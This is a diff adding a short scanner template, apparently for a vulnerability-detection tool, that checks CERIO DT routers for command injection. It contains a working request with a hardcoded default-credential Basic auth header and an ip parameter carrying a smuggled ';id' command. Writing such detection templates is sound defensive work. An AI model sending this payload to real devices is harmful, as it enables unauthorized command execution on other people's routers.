@@ -1,0 +1,22 @@
+id: cerio-dt-rce
+brief:
+    title: CERIO-DT Interface - Command Execution
+    by: pussycat0x
+    level: critical
+    about: CERIO DT series routers have an operation command injection vulnerability in specific versions. An attacker could exploit this vulnerability to execute commands.
+    label:
+        - cerio
+        - rce
+        - vuln
+moves:
+    - verb: POST
+      to:
+        - '{{BaseURL}}/cgi-bin/Save.cgi?cgi=PING'
+      head:
+        Authorization: Basic b3BlcmF0b3I6MTIzNA==
+        Content-Type: application/x-www-form-urlencoded
+      body: pid=2061&ip=127.0.0.1;id&times=1
+      signs:
+        - "on": status
+          status:
+            - 200
